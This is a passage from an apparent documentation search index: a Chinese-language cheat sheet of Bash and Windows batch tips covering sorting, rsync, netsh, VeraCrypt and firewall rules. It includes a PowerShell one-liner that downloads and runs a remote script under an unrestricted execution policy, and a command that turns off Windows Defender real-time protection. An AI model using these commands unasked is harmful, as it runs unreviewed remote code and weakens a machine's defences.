\u6309\u4eba\u7c7b\u7406\u89e3\u7684\u6587\u4ef6\u5927\u5c0f\u6392\u5e8f -h \u6307\u5b9a\u67d0\u4e9b\u5217\u6765\u6392\u5e8f -k 3,3 -k 4,4 \u6307\u5b9a\u5206\u9694\u7b26\u7528-t \u2018.\u2019 \u53c2\u8003\uff1a https://www.madboa.com/geek/sort-addr/ rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c \u00b6 rsync\u6709 --dry-run \u53c2\u6570\u786e\u8ba4\u6ca1\u51fa\u9519\u540e\u518d\u64cd\u4f5c rsync - P -- remove - source - files - avz '1.2.3.4:/root/dockerimages/*.tar.7z' ./ for filename in *. tar . 7 z ; do 7 z x - so $ filename | docker load ; mv $ filename ./ done / ; done","title":"BASH"},{"location":"BASH/#bash","text":"","title":"BASH"},{"location":"BASH/#bashalias","text":"@TAG alias \u52a0\u4e0a\u8fd9\u4e48\u4e00\u53e5\uff1a shopt -s expand_aliases","title":"\u5728bash\u811a\u672c\u4e2d\u4f7f\u7528alias"},{"location":"BASH/#_1","text":"\u5728python\u91cc\u53ef\u4ee5\u7528len(sys.argv)\u5224\u65ad\u53c2\u6570\u4e2a\u6570\uff0cbash\u91cc\u7528\u4e2d\u62ec\u53f7\u91cc\u7684-z if [ -z \"$1\" ] && [ -z \"$2\" ]; then echo \"Usage: $0 <parameter1> <parameter2>\" fi","title":"\u5224\u65ad\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u4e3a\u7a7a"},{"location":"BASH/#forseq","text":"@TAG seq \u6ce8\u610f\u7ec8\u70b9\u662f\u5305\u542b\u5728\u5185\u7684\uff0c\u4e0d\u540c\u4e8ePython\u7684range seq 3 : 1 2 3 seq 2 3 : 2 3 seq 1 2 5 : 1 3 5 for i in $(seq 1 $END); do echo $i; done","title":"for\u5faa\u73af\u7528seq\u751f\u6210\u6570\u5b57\u5217\u8868"},{"location":"BASH/#bash_1","text":"\u4e0d\u9700\u8981bc\u4e5f\u53ef\u4ee5\u76f4\u63a5\u505a\u8ba1\u7b97\uff0c\u4f8b\u5982\u8ba1\u7b975+0xa+0b1010 echo $((5+16#a+2#1010))","title":"BASH\u505a\u4e0d\u540c\u8fdb\u5236\u95f4\u6570\u5b66\u8ba1\u7b97"},{"location":"BASH/#apt","text":"command -v aria2c >/dev/null 2>&1 || { apt update && apt install -y aria2; } \u5982\u679c\u6709\u591a\u4e2a\u8f6f\u4ef6\u53ef\u80fd\u8981\u5b89\u88c5\uff0c\u6ca1\u5fc5\u8981\u6bcf\u6b21\u90fdapt update\uff0c\u53ef\u4ee5\u5148\u88c5\u4e86\u518d\u8bf4 \u5931\u8d25\u5c31apt update command -v 7z >/dev/null 2>&1 || { apt-get install -y p7zip; } command -v 7z >/dev/null 2>&1 || { apt update; apt-get install -y p7zip; }","title":"\u5224\u65ad\u547d\u4ee4\u4e0d\u5b58\u5728\u518dapt\u5b89\u88c5"},{"location":"BASH/#_2","text":"\u6ce8\u610f ] \u524d\u9762\u8981\u6709\u7a7a\u683c if [ ! -f \"somefile\" ]; then curl ... fi","title":"\u5224\u65ad\u6587\u4ef6\u4e0d\u5b58\u5728"},{"location":"BASH/#sort","text":"\u9006\u5e8f -r \u6309\u7248\u672c\u6392\u5e8f \u6392\u5e8fIP\u5730\u5740 -V \u6309\u6570\u5b57\u6392\u5e8f -n \u6309\u4eba\u7c7b\u7406\u89e3\u7684\u6587\u4ef6\u5927\u5c0f\u6392\u5e8f -h \u6307\u5b9a\u67d0\u4e9b\u5217\u6765\u6392\u5e8f -k 3,3 -k 4,4 \u6307\u5b9a\u5206\u9694\u7b26\u7528-t \u2018.\u2019 \u53c2\u8003\uff1a https://www.madboa.com/geek/sort-addr/","title":"sort\u6392\u5e8f"},{"location":"BASH/#rsync","text":"rsync\u6709 --dry-run \u53c2\u6570\u786e\u8ba4\u6ca1\u51fa\u9519\u540e\u518d\u64cd\u4f5c rsync - P -- remove - source - files - avz '1.2.3.4:/root/dockerimages/*.tar.7z' ./ for filename in *. tar . 7 z ; do 7 z x - so $ filename | docker load ; mv $ filename ./ done / ; done","title":"rsync\u79fb\u52a8\u8fdc\u7a0b\u76ee\u5f55\u7279\u5b9a\u6587\u4ef6\u81f3\u672c\u673a\u540e\u5faa\u73af\u64cd\u4f5c"},{"location":"BAT/","text":"BAT \u6279\u5904\u7406 \u00b6 \u4e5f\u5305\u542b\u4e00\u4e9bWindows\u547d\u4ee4\u884c\u5de5\u5177 \u5feb\u901f\u6253\u5f00cmd \u00b6 \u8fd8\u5728\u7528Win+R cmd\u518d\u7528pushd\u547d\u4ee4\uff1f \u5728\u8d44\u6e90\u7ba1\u7406\u5668\u7684\u5730\u5740\u680f\u8f93\u5165cmd\u56de\u8f66\u5c31\u80fd\u76f4\u63a5\u8fdb\u5165\u5f53\u524d\u76ee\u5f55 \u53e6\u5916\uff0c\u4e0d\u5982\u76f4\u63a5 \u628acmd\u52a0\u5165\u5230\u9f20\u6807\u53f3\u952e \u5e76\u5217\u8bed\u53e5\u8bed\u6cd5 \u00b6 \u987a\u5e8f\u6267\u884c & echo a & echo b \u524d\u8005\u6b63\u786e\u624d\u6267\u884c && > nul 2 > nul ping - n 1 qq . com && echo network ok \u524d\u8005\u9519\u8bef\u624d\u6267\u884c || > nul 2 > nul ping - n 1 qq . com || echo network failure \u6765\u4e00\u4e2a\u6b7b\u5faa\u73af\u5427 for \u00b6 \u7528\u4e8e\u7ed3\u675f\u8fdb\u7a0b\uff0c\u6216\u8005DNS\u67e5\u8be2\u770b\u770b\u89e3\u6790\u662f\u5426\u751f\u6548 for /l %i in (1,1,9999999) do ... \u7ed3\u675f\u8fdb\u7a0b taskkill \u00b6 \u5f53\u542f\u52a8cmd\u7a97\u53e3\u8fc7\u591a\u7684\u65f6\u5019\uff0c\u4f7f\u7528taskkill\u6279\u91cf\u5173\u95ed taskkill /f /im cmd.exe \u7c7b\u4f3c\u7684Linux\u547d\u4ee4\u4e3a killall bash \u5185\u5b58\u6574\u7406 free \u00b6 \u5fae\u8f6f\u81ea\u5df1\u51fa\u7684\u4e00\u4e2a\u5185\u5b58\u6574\u7406\u5de5\u5177\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 \u4e0b\u8f7d\uff1a empty.exe empty * \u7761\u4e00\u4f1a SleepX \u00b6 \u7a0b\u5e8f\u9700\u8981\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4\u518d\u7ee7\u7eed\u8fd0\u884c\u5c31\u53ef\u4ee5sleepx\u5566\uff0c\u4f5c\u8005Bill Stewart (bstewart@iname.com) \u4e0b\u8f7d\uff1a SleepX.exe SleepX 10 \u7b49\u5f855s\uff0c\u5982\u679c\u7528\u6237\u7b49\u4e0d\u53ca\u53ef\u4ee5\u6309\u952e\uff0c\u6b64\u65f6 not \u201c%errorlevel%\u201d == \u201c0\u201d SleepX -k 5 \u547d\u4ee4\u884c\u7684\u6d4f\u89c8\u5668 curl \u00b6 \u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09 \u5b98\u65b9\uff1ahttps://curl.haxx.se/ \u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html \u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/ \u4e0b\u8f7d7.51 x64\u7248\u672c \u5177\u4f53\u8bf7\u89c1\u5355\u72ec\u6587\u6863 cURL.md \u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728 \u00b6 \u901a\u8fc7\u5224\u65adnul\u8fd9\u4e2a\u7279\u6b8a\u6587\u4ef6\u7684\u5b58\u5728\u6027\uff08\u7528\u6237\u5e76\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\u540d\u5f62\u5982nul\u7684\u7279\u6b8a\u6587\u4ef6\uff09 if exist DIRNAME\\nul echo Yes! \u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create \u00b6 Win7\u53ca\u4ee5\u4e0a\uff1a mklink /H Link Target \u76ee\u5f55\u8fd8\u9700\u8981/J mklink /H /J Link Target WinXP\u53ea\u80fd\u7528\uff1a fsutil hardlink create <new filename> <existing filename> \u7aef\u53e3\u8f6c\u53d1 \u00b6 \u6b64\u547d\u4ee4\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=\u8f6c\u53d1\u51fa\u7684\u7aef\u53e3 connectaddress=\u8f6c\u53d1\u7684\u6e90IP\u5730\u5740 connectport=\u8f6c\u53d1\u7684\u6e90\u7aef\u53e3 \u4fdd\u6301RVPN\u4e0d\u65ad\u5f00 \u00b6 rvpn\u4f1a\u81ea\u52a8\u65ad\u5f00\uff0c\u6240\u4ee5\u5199\u4e86\u4e2a\u811a\u672c\u5224\u65ad\u5e76\u81ea\u52a8\u91cd\u8fde RVPNKeepAlive.bat \u5176\u4e2d\u7684\u77e5\u8bc6\u70b9\uff1a \u5224\u65ad\u547d\u4ee4\u662f\u5426\u6210\u529f\u7528if \u201c%errorlevel%\u201d==\u201d0\u201d\uff0cerrorlevel\u8fd9\u4e2a\u53d8\u91cf\u662f\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u8fd4\u56de\u7ed3\u679c\uff08C\u7a0b\u5e8f\u7684int main\u7684\u8fd4\u56de\u503c\uff09\uff0c\u4e00\u822c\u89c4\u5b9a\u8fd4\u56de0\u8868\u793a\u6ca1\u6709\u53d1\u751f\u9519\u8bef \u7528ping www.baidu.com\u548cping -n 2 ip.cn\u505a\u7c97\u7cd9\u7684\u7b49\u5f85\u5ef6\u65f6\uff0c\u5176\u4e2d-n\u8868\u793aping\u7684\u6b21\u6570\uff0c\u9ed8\u8ba4\u662f4\uff0c\u6539\u5c0f\u4e00\u70b9\u5c31\u662f\u66f4\u77ed\u7684\u5ef6\u65f6\u54af \u542f\u52a8\u4e00\u4e2aGUI\u7684exe\uff0c\u9700\u8981\u7528start \u201c\u201d example.exe \u6d59\u6c5f\u5927\u5b66\u6709\u7ebfvpn\u9759\u6001\u8def\u7531\u914d\u7f6e\u811a\u672c \u00b6 Author: shuishui \u9759\u6001\u8def\u7531\u8bbe\u7f6e.bat \u8fdb\u5165\u4f11\u7720 \u00b6 Win10\u4f3c\u4e4e\u6ca1\u6709\u4ece\u9f20\u6807\u8fdb\u5165\u4f11\u7720\u800c\u4e0d\u662f\u7761\u7720\u7684\u65b9\u6cd5\uff0c\u4f46\u8c03\u7528rundll32\u8fdb\u5165\u4f11\u7720\u6a21\u5f0f\u8fd8\u662f\u53ef\u4ee5\u7684\uff1a rundll32.exe powrProf.dll,SetSuspendState \u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e \u00b6 @TAG \u4ee3\u7406 From: https://stackoverflow.com/questions/3648366/is-it-possible-to-launch-ies-proxy-settings-dialog-from-the-command-line \u4e0d\u7528\u542f\u52a8 c:\\Program Files\\Internet Explorer\\iexplore.exe \uff0c\u76f4\u63a5Win+R\u8f93\u5165\u8fd9\u4e2a\u5c31\u80fd\u6253\u5f00IE\u7684\u8fde\u63a5\u8bbe\u7f6e\uff0c\u65b9\u4fbf\u4fee\u6539\u4ee3\u7406\uff1a inetcpl.cpl ,4 \u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650 \u00b6 \u6bd4\u5982\u4e0b\u6587\u7684\u4fee\u6539ip\u7b49\u64cd\u4f5c\u5c31\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4f60\u53ef\u4ee5\u5148\u542f\u52a8\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u518d\u8fd0\u884c\u4e00\u4e2a\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff1b\u73b0\u5728\u6709\u4e86\u66f4\u52a0\u76f4\u63a5\u7684\u64cd\u4f5c \u65b9\u68481\uff1a elevate \u00b6 \u4e0b\u8f7d\u5730\u5740\uff1a http://code.kliu.org/misc/elevate/elevate-1.3.0-redist.7z \u7279\u70b9\uff1a\u6709UAC\u5f39\u7a97\uff0c\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3 \u4f8b\u5b50\uff1a REM \u542f\u52a8\u4e00\u4e2a\u7279\u6743\u7684cmd elevate -k REM \u6267\u884cdir\u5e76\u7b49\u5f85\u7ed3\u675f elevate -c -w dir \u65b9\u68482\uff1aSudo for Windows \u2013 Luke Sampson \u00b6 \u53c2\u8003\uff1ahttps://helpdeskgeek.com/free-tools-review/5-windows-alternatives-linux-sudo-command/ \u5728powershell\u4e2d\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\u5b89\u88c5\uff1a iex ( new - object net . webclient ) . downloadstring ( \u2018 https : // get . scoop . sh \u2019 ) set - executionpolicy unrestricted - s cu - f scoop install sudo \u7279\u70b9\uff1a\u6bd4\u8f83\u6162\uff0c\u4ecd\u7136\u6709UAC\u5f39\u7a97\uff0c\u4e0d\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3 \u547d\u4ee4\u884c\u914d\u7f6eIP \u00b6 \u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53c2\u89c1\u4e0a\u65b9 \u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650 \u53c2\u8003\uff1ahttps://helpdeskgeek.com/networking/change-ip-address-and-dns-servers-using-the-command-prompt/ \u9996\u5148\u4f7f\u7528 netsh interface ip show config \u67e5\u770b\u9002\u914d\u5668\u7684\u540d\u79f0\uff0c\u5047\u8bbe\u9700\u8981\u914d\u7f6e\u7684\u662f \u4ee5\u592a\u7f51 \u914d\u7f6e\u9759\u6001IP\u548cDNS \u00b6 netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" static 192.168.1.101 255.255.255.0 192.168.1.1 netsh interface ip set dns \"\u4ee5\u592a\u7f51\" static 192.168.1.1 \u914d\u7f6eDHCP \u00b6 netsh interface ip set address name=\"\u4ee5\u592a\u7f51\" dhcp netsh interface ip set dns \"\u4ee5\u592a\u7f51\" dhcp \u547d\u4ee4\u884c\u4f7f\u7528VeraCrypt \u00b6 VeraCrypt\u662fTrueCrypt\u4ee3\u66ff\u8005\uff0c\u5176\u547d\u4ee4\u884c\u4f7f\u7528\u65b9\u5f0f\uff1a https://www.veracrypt.fr/en/Command%20Line%20Usage.html \u4e0b\u8f7dPortable\u7248\u672c\u5373\u53ef\uff0c\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.veracrypt.fr/en/Downloads.html \u521b\u5efa\u4e00\u4e2a\u52a0\u5bc6\u76d8 \u00b6 \u4e0d\u4e0e\u7528\u6237\u4ea4\u4e92\u6240\u4ee5\u6307\u5b9a /q /s \uff0c\u5177\u4f53\u6765\u8bf4/q\u8868\u793a\u4e0d\u663e\u793a\u4e3b\u7a97\u53e3\uff0c/s\u8868\u793a\u4e0d\u663e\u793a\u4efb\u4f55\u4ea4\u4e92\u7a97\u53e3\u4e5f\u4e0d\u62a5\u9519\uff0c\u6ce8\u610f\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53c2\u6570\u540e\u5373\u4f7f\u51fa\u9519\u4e5f\u4e0d\u4f1a\u6709\u4efb\u4f55\u63d0\u9192 \u6587\u4ef6\u540dtest.hc\uff0c\u5927\u5c0f100M\uff0c\u5bc6\u7801\u5fc5\u987b20\u4e2a\u5b57\u7b26\u6216\u4ee5\u4e0a\uff0c\u52a0\u5bc6\u65b9\u5f0f\u4f7f\u7528\u6700\u5feb\u7684Serpent\uff0c\u4e3a\u4e86\u52a0\u901f\u6302\u8f7d\u8fc7\u7a0b\u6307\u5b9a/pim 1 \"VeraCrypt Format.exe\" /create test.hc /password testtesttesttesttest /hash sha512 /encryption serpent /filesystem FAT /size 100M /pim 1 /force /silent \u5982\u679c\u4e0d\u6307\u5b9a/pim\u6765\u964d\u4f4e\u8fed\u4ee3\u6b21\u6570\uff0c\u6302\u8f7d\u65f6\u9700\u8981\u8017\u65f6\u5341\u79d2\u4ee5\u4e0a\u65e0\u6cd5\u63a5\u53d7\uff0c\u6240\u4ee5\u727a\u7272\u4e00\u70b9\u5b89\u5168\u6027\u6765\u6362\u53d6\u6027\u80fd\u3002\u5173\u4e8ePIM\u7684\u6587\u6863\uff1a https://www.veracrypt.fr/en/Personal%20Iterations%20Multiplier%20(PIM).html \u6302\u8f7d\u52a0\u5bc6\u76d8 \u00b6 \u6302\u8f7dtest.hc\u81f3Z:\u76d8\uff0c\u9700\u8981\u6307\u5b9a\u4e0e\u521b\u5efa\u8fc7\u7a0b\u76f8\u540c\u7684/pim \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u7acb\u5373\u8fd4\u56de\uff0c\u4f46\u771f\u6b63\u6302\u8f7d\u53ef\u4ee5\u8bbf\u95eeZ\u76d8\u53ef\u80fd\u8fd8\u9700\u8981\u7b49\u5f85\u6570\u79d2 VeraCrypt.exe /quit /silent /volume test.hc /password testtesttesttesttest /pim 1 /l z \u5378\u8f7d\u5df2\u7ecf\u6302\u8f7d\u7684\u52a0\u5bc6\u76d8 \u00b6 VeraCrypt.exe /quit /silent /dismount z \u547d\u4ee4\u884c\u5173\u95edWindows Defender \u00b6 \u5728\u8fdb\u884c\u5927\u91cfIO\u64cd\u4f5c\u7684\u65f6\u5019\uff08\u5982\u62f7\u8d1d\u5927\u91cf\u5c0f\u6587\u4ef6\uff09\uff0cWindows Defender\u4f1a\u4e25\u91cd\u62d6\u6162\u4efb\u52a1\u901f\u5ea6 \u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0bpowershell\u53ef\u4ee5\u76f4\u63a5\u4e34\u65f6\u5173\u95edWindows Defender\u7684\u5b9e\u65f6\u9632\u62a4 \u642d\u914delevate.exe\u4f7f\u7528\u5373\u53ef\u5728Win+R\u4e2d\u5feb\u901f\u5173\u95ed\uff1a elevate powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\" \u8fd9\u4e2a\u4f3c\u4e4e\u5728\u6700\u65b0\u7684Windows 2004\u5df2\u7ecf\u5931\u6548 \u547d\u4ee4\u884c\u589e\u52a0Windows\u9632\u706b\u5899\u89c4\u5219\u963b\u65adIP \u00b6 @TAG \u9632\u706b\u5899 \u5f53\u7136\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff0c\u80fd\u4e00\u884c\u641e\u5b9a\u4f55\u5fc5\u5728\u7e41\u7410\u7684\u8bbe\u7f6e\u6b65\u9aa4\u4e2d\u5468\u65cb \u53c2\u8003 https://serverfault.com/questions/851922/blocking-ip-address-with-netsh-filter netsh advfirewall firewall add rule name=\"IP Block\" ^ dir=in interface=any action=block remoteip=198.51.100.108/32","title":"BAT\u6279\u5904\u7406"},{"location":"BAT/#bat","text":"\u4e5f\u5305\u542b\u4e00\u4e9bWindows\u547d\u4ee4\u884c\u5de5\u5177","title":"BAT \u6279\u5904\u7406"},{"location":"BAT/#cmd","text":"\u8fd8\u5728\u7528Win+R cmd\u518d\u7528pushd\u547d\u4ee4\uff1f \u5728\u8d44\u6e90\u7ba1\u7406\u5668\u7684\u5730\u5740\u680f\u8f93\u5165cmd\u56de\u8f66\u5c31\u80fd\u76f4\u63a5\u8fdb\u5165\u5f53\u524d\u76ee\u5f55 \u53e6\u5916\uff0c\u4e0d\u5982\u76f4\u63a5 \u628acmd\u52a0\u5165\u5230\u9f20\u6807\u53f3\u952e","title":"\u5feb\u901f\u6253\u5f00cmd"},{"location":"BAT/#_1","text":"\u987a\u5e8f\u6267\u884c & echo a & echo b \u524d\u8005\u6b63\u786e\u624d\u6267\u884c && > nul 2 > nul ping - n 1 qq . com && echo network ok \u524d\u8005\u9519\u8bef\u624d\u6267\u884c || > nul 2 > nul ping - n 1 qq . com || echo network failure","title":"\u5e76\u5217\u8bed\u53e5\u8bed\u6cd5"},{"location":"BAT/#for","text":"\u7528\u4e8e\u7ed3\u675f\u8fdb\u7a0b\uff0c\u6216\u8005DNS\u67e5\u8be2\u770b\u770b\u89e3\u6790\u662f\u5426\u751f\u6548 for /l %i in (1,1,9999999) do ...","title":"\u6765\u4e00\u4e2a\u6b7b\u5faa\u73af\u5427 for"},{"location":"BAT/#taskkill","text":"\u5f53\u542f\u52a8cmd\u7a97\u53e3\u8fc7\u591a\u7684\u65f6\u5019\uff0c\u4f7f\u7528taskkill\u6279\u91cf\u5173\u95ed taskkill /f /im cmd.exe \u7c7b\u4f3c\u7684Linux\u547d\u4ee4\u4e3a killall bash","title":"\u7ed3\u675f\u8fdb\u7a0b taskkill"},{"location":"BAT/#free","text":"\u5fae\u8f6f\u81ea\u5df1\u51fa\u7684\u4e00\u4e2a\u5185\u5b58\u6574\u7406\u5de5\u5177\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 \u4e0b\u8f7d\uff1a empty.exe empty *","title":"\u5185\u5b58\u6574\u7406 free"},{"location":"BAT/#sleepx","text":"\u7a0b\u5e8f\u9700\u8981\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4\u518d\u7ee7\u7eed\u8fd0\u884c\u5c31\u53ef\u4ee5sleepx\u5566\uff0c\u4f5c\u8005Bill Stewart (bstewart@iname.com) \u4e0b\u8f7d\uff1a SleepX.exe SleepX 10 \u7b49\u5f855s\uff0c\u5982\u679c\u7528\u6237\u7b49\u4e0d\u53ca\u53ef\u4ee5\u6309\u952e\uff0c\u6b64\u65f6 not \u201c%errorlevel%\u201d == \u201c0\u201d SleepX -k 5","title":"\u7761\u4e00\u4f1a SleepX"},{"location":"BAT/#curl","text":"\u5927\u540d\u9f0e\u9f0e\u7684cURL\uff0c\u4e0d\u5fc5\u591a\u8a00\uff1b\u53ea\u662f\u5b83\u7684\u547d\u4ee4\u884c\u7684\u8fd0\u884c\u65b9\u5f0f\u4e0elibcurl\u7528\u8d77\u6765\u5dee\u5f02\u5f88\u5927\uff08\u5982\u6bd4\u8f83php\u7684curl\u7528\u6cd5\uff09 \u5b98\u65b9\uff1ahttps://curl.haxx.se/ \u7b80\u5355\u5165\u95e8\uff1ahttp://www.bathome.net/thread-1761-1-1.html \u5c06curl\u8f6c\u4e3apython requests http://curl.trillworks.com/ \u4e0b\u8f7d7.51 x64\u7248\u672c \u5177\u4f53\u8bf7\u89c1\u5355\u72ec\u6587\u6863 cURL.md","title":"\u547d\u4ee4\u884c\u7684\u6d4f\u89c8\u5668 curl"},{"location":"BAT/#_2","text":"\u901a\u8fc7\u5224\u65adnul\u8fd9\u4e2a\u7279\u6b8a\u6587\u4ef6\u7684\u5b58\u5728\u6027\uff08\u7528\u6237\u5e76\u4e0d\u80fd\u521b\u5efa\u6587\u4ef6\u540d\u5f62\u5982nul\u7684\u7279\u6b8a\u6587\u4ef6\uff09 if exist DIRNAME\\nul echo Yes!","title":"\u5224\u65ad\u6587\u4ef6\u5939\u5b58\u5728"},{"location":"BAT/#mklinkfsutil-hardlink-create","text":"Win7\u53ca\u4ee5\u4e0a\uff1a mklink /H Link Target \u76ee\u5f55\u8fd8\u9700\u8981/J mklink /H /J Link Target WinXP\u53ea\u80fd\u7528\uff1a fsutil hardlink create <new filename> <existing filename>","title":"\u521b\u5efa\u786c\u94fe\u63a5mklink\u6216\u8005fsutil hardlink create"},{"location":"BAT/#_3","text":"\u6b64\u547d\u4ee4\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650 netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=\u8f6c\u53d1\u51fa\u7684\u7aef\u53e3 connectaddress=\u8f6c\u53d1\u7684\u6e90IP\u5730\u5740 connectport=\u8f6c\u53d1\u7684\u6e90\u7aef\u53e3","title":"\u7aef\u53e3\u8f6c\u53d1"},{"location":"BAT/#rvpn","text":"rvpn\u4f1a\u81ea\u52a8\u65ad\u5f00\uff0c\u6240\u4ee5\u5199\u4e86\u4e2a\u811a\u672c\u5224\u65ad\u5e76\u81ea\u52a8\u91cd\u8fde RVPNKeepAlive.bat \u5176\u4e2d\u7684\u77e5\u8bc6\u70b9\uff1a \u5224\u65ad\u547d\u4ee4\u662f\u5426\u6210\u529f\u7528if \u201c%errorlevel%\u201d==\u201d0\u201d\uff0cerrorlevel\u8fd9\u4e2a\u53d8\u91cf\u662f\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u8fd4\u56de\u7ed3\u679c\uff08C\u7a0b\u5e8f\u7684int main\u7684\u8fd4\u56de\u503c\uff09\uff0c\u4e00\u822c\u89c4\u5b9a\u8fd4\u56de0\u8868\u793a\u6ca1\u6709\u53d1\u751f\u9519\u8bef \u7528ping www.baidu.com\u548cping -n 2 ip.cn\u505a\u7c97\u7cd9\u7684\u7b49\u5f85\u5ef6\u65f6\uff0c\u5176\u4e2d-n\u8868\u793aping\u7684\u6b21\u6570\uff0c\u9ed8\u8ba4\u662f4\uff0c\u6539\u5c0f\u4e00\u70b9\u5c31\u662f\u66f4\u77ed\u7684\u5ef6\u65f6\u54af \u542f\u52a8\u4e00\u4e2aGUI\u7684exe\uff0c\u9700\u8981\u7528start \u201c\u201d example.exe","title":"\u4fdd\u6301RVPN\u4e0d\u65ad\u5f00"},{"location":"BAT/#vpn","text":"Author: shuishui \u9759\u6001\u8def\u7531\u8bbe\u7f6e.bat","title":"\u6d59\u6c5f\u5927\u5b66\u6709\u7ebfvpn\u9759\u6001\u8def\u7531\u914d\u7f6e\u811a\u672c"},{"location":"BAT/#_4","text":"Win10\u4f3c\u4e4e\u6ca1\u6709\u4ece\u9f20\u6807\u8fdb\u5165\u4f11\u7720\u800c\u4e0d\u662f\u7761\u7720\u7684\u65b9\u6cd5\uff0c\u4f46\u8c03\u7528rundll32\u8fdb\u5165\u4f11\u7720\u6a21\u5f0f\u8fd8\u662f\u53ef\u4ee5\u7684\uff1a rundll32.exe powrProf.dll,SetSuspendState","title":"\u8fdb\u5165\u4f11\u7720"},{"location":"BAT/#_5","text":"@TAG \u4ee3\u7406 From: https://stackoverflow.com/questions/3648366/is-it-possible-to-launch-ies-proxy-settings-dialog-from-the-command-line \u4e0d\u7528\u542f\u52a8 c:\\Program Files\\Internet Explorer\\iexplore.exe \uff0c\u76f4\u63a5Win+R\u8f93\u5165\u8fd9\u4e2a\u5c31\u80fd\u6253\u5f00IE\u7684\u8fde\u63a5\u8bbe\u7f6e\uff0c\u65b9\u4fbf\u4fee\u6539\u4ee3\u7406\uff1a inetcpl.cpl ,4","title":"\u5feb\u901f\u8fdb\u5165\u7cfb\u7edf\u4ee3\u7406\u8bbe\u7f6e"},{"location":"BAT/#cmd_1","text":"\u6bd4\u5982\u4e0b\u6587\u7684\u4fee\u6539ip\u7b49\u64cd\u4f5c\u5c31\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\u4f60\u53ef\u4ee5\u5148\u542f\u52a8\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u518d\u8fd0\u884c\u4e00\u4e2a\u7ba1\u7406\u5458\u6743\u9650\u7684cmd\uff1b\u73b0\u5728\u6709\u4e86\u66f4\u52a0\u76f4\u63a5\u7684\u64cd\u4f5c","title":"\u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650"},{"location":"BAT/#1elevate","text":"\u4e0b\u8f7d\u5730\u5740\uff1a http://code.kliu.org/misc/elevate/elevate-1.3.0-redist.7z \u7279\u70b9\uff1a\u6709UAC\u5f39\u7a97\uff0c\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3 \u4f8b\u5b50\uff1a REM \u542f\u52a8\u4e00\u4e2a\u7279\u6743\u7684cmd elevate -k REM \u6267\u884cdir\u5e76\u7b49\u5f85\u7ed3\u675f elevate -c -w dir","title":"\u65b9\u68481\uff1aelevate"},{"location":"BAT/#2sudo-for-windows-luke-sampson","text":"\u53c2\u8003\uff1ahttps://helpdeskgeek.com/free-tools-review/5-windows-alternatives-linux-sudo-command/ \u5728powershell\u4e2d\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\u5b89\u88c5\uff1a iex ( new - object net . webclient ) . downloadstring ( \u2018 https : // get . scoop . sh \u2019 ) set - executionpolicy unrestricted - s cu - f scoop install sudo \u7279\u70b9\uff1a\u6bd4\u8f83\u6162\uff0c\u4ecd\u7136\u6709UAC\u5f39\u7a97\uff0c\u4e0d\u4f1a\u542f\u52a8\u4e00\u4e2a\u65b0\u7a97\u53e3","title":"\u65b9\u68482\uff1aSudo for Windows \u2013 Luke Sampson"},{"location":"BAT/#ip","text":"\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53c2\u89c1\u4e0a\u65b9 \u5728\u666e\u901a\u6743\u9650cmd\u4e2d\u83b7\u5f97\u66f4\u9ad8\u6743\u9650 \u53c2\u8003\uff1ahttps://helpdeskgeek.com/networking/change-ip-address-and-dns-servers-using-the-command-prompt/ \u9996\u5148\u4f7f\u7528 netsh interface ip show config \u67e5\u770b\u9002\u914d\u5668\u7684\u540d\u79f0\uff0c\u5047\u8bbe\u9700\u8981\u914d\u7f6e\u7684\u662f 